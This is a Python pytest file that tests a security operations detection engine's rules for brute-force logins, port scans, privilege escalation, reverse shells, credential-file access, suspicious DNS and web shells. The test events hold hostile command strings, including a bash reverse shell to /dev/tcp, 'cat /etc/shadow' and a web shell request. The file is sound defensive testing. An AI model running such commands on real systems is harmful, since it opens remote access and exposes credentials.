"""
Tests for the CyberTwin SOC DetectionEngine and detection rules.
"""

import pytest
from datetime import datetime, timedelta

from backend.detection.engine import DetectionEngine


@pytest.fixture
def engine():
    return DetectionEngine()


def _make_failed_login(user, src_ip, ts):
    """Helper to create a failed login log event dict."""
    return {
        "log_source": "authentication",
        "event_type": "login_failure",
        "user": user,
        "src_ip": src_ip,
        "src_host": "srv-web-01",
        "timestamp": ts.isoformat(),
        "description": f"Failed login for {user}",
    }


def _make_network_event(src_ip, dst_port, ts):
    """Helper to create a network event dict."""
    return {
        "log_source": "network",
        "event_type": "connection",
        "src_ip": src_ip,
        "src_host": "attacker",
        "dst_host": "target-srv",
        "timestamp": ts.isoformat(),
        "raw_data": {"dst_port": dst_port},
        "description": f"Connection to port {dst_port}",
    }


class TestDetectionEngine:

    def test_all_15_rules_loaded(self, engine):
        """The default engine should load all 15 detection rules."""
        assert len(engine._rules) >= 15  # 15 base rules + additional detection rules

    def test_brute_force_rule_triggers(self, engine):
        """More than 5 failed logins from the same user in 5 min should trigger."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        logs = [
            _make_failed_login("admin", "10.0.0.5", base + timedelta(seconds=i * 10))
            for i in range(8)
        ]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-001" in rule_ids

    def test_brute_force_rule_no_trigger(self, engine):
        """Fewer than 5 failed logins should NOT trigger brute force rule."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        logs = [
            _make_failed_login("admin", "10.0.0.5", base + timedelta(seconds=i * 10))
            for i in range(3)
        ]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-001" not in rule_ids

    def test_port_scan_rule_triggers(self, engine):
        """More than 10 distinct dst ports from the same src IP should trigger."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        ports = [22, 80, 443, 445, 3306, 3389, 5432, 8080, 8443, 21, 25, 53]
        logs = [
            _make_network_event("192.168.1.100", port, base + timedelta(seconds=i * 2))
            for i, port in enumerate(ports)
        ]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-005" in rule_ids

    def test_port_scan_no_trigger_few_ports(self, engine):
        """Fewer than 10 distinct ports should NOT trigger port scan."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        ports = [22, 80, 443]
        logs = [
            _make_network_event("192.168.1.100", port, base + timedelta(seconds=i * 2))
            for i, port in enumerate(ports)
        ]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-005" not in rule_ids

    def test_privilege_escalation_rule(self, engine):
        """A process event with sudo in command_line should trigger RULE-007."""
        logs = [{
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "sudo su - root",
            "user": "deploy",
            "src_host": "srv-app-01",
            "timestamp": "2024-01-01T10:00:00",
        }]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-007" in rule_ids

    def test_suspicious_process_rule(self, engine):
        """A reverse shell command should trigger RULE-008."""
        logs = [{
            "log_source": "process",
            "event_type": "process_create",
            "command_line": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "user": "www-data",
            "src_host": "srv-web-01",
            "timestamp": "2024-01-01T10:00:00",
        }]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-008" in rule_ids

    def test_sensitive_file_access_rule(self, engine):
        """Access to /etc/shadow should trigger RULE-010."""
        logs = [{
            "log_source": "file_access",
            "event_type": "file_read",
            "command_line": "cat /etc/shadow",
            "description": "File read: /etc/shadow",
            "user": "attacker",
            "src_host": "srv-linux-01",
            "timestamp": "2024-01-01T10:00:00",
        }]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-010" in rule_ids

    def test_unusual_dns_rule_suspicious_tld(self, engine):
        """A DNS query to a .xyz TLD should trigger RULE-012."""
        logs = [{
            "log_source": "dns",
            "event_type": "dns_query",
            "timestamp": "2024-01-01T10:00:00",
            "raw_data": {"query": "evil-payload.xyz", "record_type": "A"},
            "description": "DNS query for evil-payload.xyz",
        }]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-012" in rule_ids

    def test_correlate_incidents_groups_related(self, engine):
        """Alerts sharing the same host should be grouped into an incident."""
        alerts = [
            {
                "alert_id": "ALR-001",
                "rule_id": "RULE-001",
                "severity": "high",
                "tactic": "Credential Access",
                "technique_id": "T1110",
                "timestamp": "2024-01-01T10:00:00",
                "affected_hosts": ["srv-web-01"],
                "affected_users": ["admin"],
            },
            {
                "alert_id": "ALR-002",
                "rule_id": "RULE-007",
                "severity": "medium",
                "tactic": "Privilege Escalation",
                "technique_id": "T1548",
                "timestamp": "2024-01-01T10:05:00",
                "affected_hosts": ["srv-web-01"],
                "affected_users": ["admin"],
            },
        ]
        incidents = engine.correlate_incidents(alerts)
        assert len(incidents) >= 1
        assert incidents[0]["alert_count"] == 2

    def test_mitre_coverage_returns_matrix(self, engine):
        """After analyse, get_mitre_coverage should return a valid structure."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        logs = [
            _make_failed_login("admin", "10.0.0.5", base + timedelta(seconds=i * 10))
            for i in range(8)
        ]
        engine.analyse(logs)
        coverage = engine.get_mitre_coverage()
        assert "coverage_matrix" in coverage
        assert "heatmap" in coverage
        assert "tactics_covered" in coverage
        assert "total_techniques_detected" in coverage

    def test_web_shell_rule(self, engine):
        """Web shell indicators in web_access logs should trigger RULE-013."""
        logs = [{
            "log_source": "web_access",
            "event_type": "web_request",
            "timestamp": "2024-01-01T10:00:00",
            "description": "GET /uploads/shell.php?cmd=whoami",
            "raw_data": {"url": "/uploads/shell.php?cmd=whoami"},
            "command_line": "",
        }]
        alerts = engine.analyse(logs)
        rule_ids = [a["rule_id"] for a in alerts]
        assert "RULE-013" in rule_ids

    def test_alert_has_required_fields(self, engine):
        """Each alert should contain essential fields."""
        base = datetime(2024, 1, 1, 10, 0, 0)
        logs = [
            _make_failed_login("admin", "10.0.0.5", base + timedelta(seconds=i * 10))
            for i in range(8)
        ]
        alerts = engine.analyse(logs)
        assert len(alerts) > 0
        alert = alerts[0]
        required = {"alert_id", "rule_id", "rule_name", "severity", "tactic",
                     "technique_id", "technique_name", "timestamp"}
        assert required.issubset(alert.keys())
